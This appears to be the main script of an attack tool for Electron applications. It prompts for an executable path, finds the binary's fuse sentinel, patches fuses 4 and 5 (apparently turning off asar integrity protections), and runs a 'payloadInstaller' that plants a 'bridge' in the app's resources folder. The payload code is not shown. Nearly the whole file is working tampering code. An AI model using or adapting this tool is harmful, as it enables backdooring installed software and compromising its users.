
import logger from './utils/logger.js';
import * as readline from 'node:readline/promises';
import { stdin as input, stdout as output } from 'node:process';
import fs from 'fs/promises';
import fuseUtils from './utils/fuseUtils.js';
import path from 'path';
import payloadInstaller from './utils/payloadInstaller.js';

logger.success("   _____                       .__               ");
logger.success("  /  _  \\   ___________ _______|__| ____   ____  ");
logger.success(" /  /_\\  \\ /  ___/\\__  \\\\_  __ \\  |/  _ \\ /    \\ ");
logger.success("/    |    \\\\___ \\  / __ \\|  | \\/  (  <_> )   |  \\\ ");
logger.success("\\____|__  /____  >(____  /__|  |__|\\____/|___|  /");
logger.success("        \\/     \\/                             \\/ \n");
logger.success("            Made by Zer0SuperNova \n")
logger.notify("            Started at: " + logger.currentTime());
logger.notify("            Node Version: " + process.version);
console.log("\n");


const rl = readline.createInterface({ input, output });

const electronExecutablePath = await rl.question('Path: ');
rl.close();

try {
    await fs.stat(electronExecutablePath);
} catch (error) {
    if (error.code === 'ENOENT') {
        logger.critical(`executable not found at: ${electronExecutablePath}`);
        process.exit(1);
    } else {
        throw error;
    }
}


try {
    logger.notify(`\n--- Scanning: ${path.basename(electronExecutablePath)} ---`);
    const buffer = await fs.readFile(electronExecutablePath);

    const offset = fuseUtils.findSentinel(buffer);
    logger.success(`[+] Found Sentinel at 0x${offset.toString(16)}`);


    const fuseStart = offset +  fuseUtils.SENTINEL.length;

    fuseUtils.getFuseConfiguration(buffer, fuseStart);
    console.log("\n");

    await fuseUtils.patchSpecificFuses(electronExecutablePath, buffer, fuseStart, [4, 5]);

    // add bridge
    const resourcePath = path.join(path.dirname(electronExecutablePath), 'resources');
    await payloadInstaller.patch(resourcePath);

} catch (error) {
    console.log(error);
}